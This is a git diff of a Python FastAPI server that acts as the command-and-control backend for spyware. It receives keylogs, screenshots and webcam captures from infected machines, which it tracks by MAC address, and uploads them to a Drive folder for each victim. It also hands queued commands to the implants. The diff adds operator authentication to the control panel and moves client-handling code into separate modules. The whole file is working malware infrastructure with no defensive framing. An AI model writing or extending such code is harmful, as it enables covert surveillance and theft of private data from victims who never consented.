@@ -1,30 +1,41 @@
 import uvicorn
-import json
 import os
-from fastapi import FastAPI, Request, Form
+from fastapi import FastAPI, Request, Form, Depends
 from fastapi.responses import HTMLResponse
 from typing import Dict, List
-import base64
-from driveapi import create_folder, upload_file_from_file
+from security import get_current_username
+from db_utils import load_db, write_db
+from handle_clients import handle_command_request, handle_first_command, upload_file
 
 app = FastAPI()
-DB_NAME = 'db.json'
-TEMP_FILE = 'temp'
 
 
 @app.get('/')
-async def root():
+async def root(username: str = Depends(get_current_username)):
     with open('source_files/index.html', 'r') as file:
         return HTMLResponse(file.read())
 
 
+@app.get('/add_commands.html')
+async def add_commands_html(username: str = Depends(get_current_username)):
+    with open('source_files/add_commands.html', 'r') as file:
+        return HTMLResponse(file.read())
+
+
+@app.get('/view_clients.html')
+async def root(username: str = Depends(get_current_username)):
+    with open('source_files/view_clients.html', 'r') as file:
+        return HTMLResponse(file.read())
+
+
 @app.get('/db.json')
-async def db_json():
+async def db_json(username: str = Depends(get_current_username)):
     return load_db()
 
 
 @app.post('/add_command')
-async def add_command(mac_address: str = Form(default=None),
+async def add_command(username: str = Depends(get_current_username),
+                      mac_address: str = Form(default=None),
                       commands: str = Form(default="")):
     db = load_db()
     db[mac_address]['commands'] += commands.split(',')
@@ -35,26 +46,12 @@ async def add_command(mac_address: str = Form(default=None),
 
 @app.get('/first_command')
 async def first_command(request: Request) -> Dict[str, List[str]]:
-    db = load_db()
-    mac = request.headers['MAC-Address']
-    date_time = request.headers['Date']
-    if db.get(mac, None) is None:
-        initialize_new_client(mac, date_time, db)
-        return {'commands': ['no_commands']}
-    else:
-        db[mac]['last_datetime'] = date_time
-        write_db(db)
-        return get_commands(mac_address=mac, db=db)
+    return handle_first_command(request)
 
 
 @app.get('/command')
 async def command(request: Request) -> Dict[str, List[str]]:
-    db = load_db()
-    date_time = request.headers['Date']
-    mac = request.headers['MAC-Address']
-    db[mac]['last_datetime'] = date_time
-    write_db(db)
-    return get_commands(mac_address=mac, db=db)
+    return handle_command_request(request)
 
 
 @app.post('/keylog_data')
@@ -72,55 +69,6 @@ async def screenshot(request: Request) -> None:
 async def webcam_capture(request: Request) -> None:
     file_type = request.headers['Content-Type'].split('/')[1]
     await upload_file(request, 'webcam', 'webcam_shots_taken', file_type, False)
-
-
-async def upload_file(request: Request, filename: str, db_identifier: str,
-                      file_type: str, remove_nulls: bool) -> None:
-    data = await request.body()
-    if remove_nulls:
-        data = data.replace(b'\x00', b'')
-    mac = request.headers['MAC-Address']
-    db = load_db()
-    title = f'{filename}{db[mac][db_identifier]}.{file_type}'
-    with open(TEMP_FILE, 'wb') as f:
-        f.write(data)
-    db[mac][db_identifier] += 1
-    write_db(db)
-    upload_file_from_file(title=title, src_filename=TEMP_FILE,
-                          mime_type=request.headers['Content-Type'], parent=mac)
-
-
-def load_db() -> dict:
-    with open(DB_NAME, 'r') as file:
-        db = json.loads(file.read())
-    return db
-
-
-def write_db(db: dict) -> None:
-    with open(DB_NAME, 'w') as file:
-        file.write(json.dumps(db))
-
-
-def initialize_new_client(mac_address: str, datetime: str, db: dict) -> None:
-    db[mac_address] = {
-        'commands': [],
-        'last_datetime': datetime,
-        'screenshots_taken': 0,
-        'webcam_shots_taken': 0,
-        'keylogs_received': 0
-    }
-    write_db(db)
-    create_folder(mac_address)
-
-
-def get_commands(mac_address: str, db: dict) -> Dict[str, List[str]]:
-    commands = db[mac_address]['commands']
-    if not commands:
-        return {'commands': ['no_commands']}
-    else:
-        db[mac_address]['commands'] = []
-        write_db(db)
-        return {'commands': commands}
 
 
 if __name__ == '__main__':
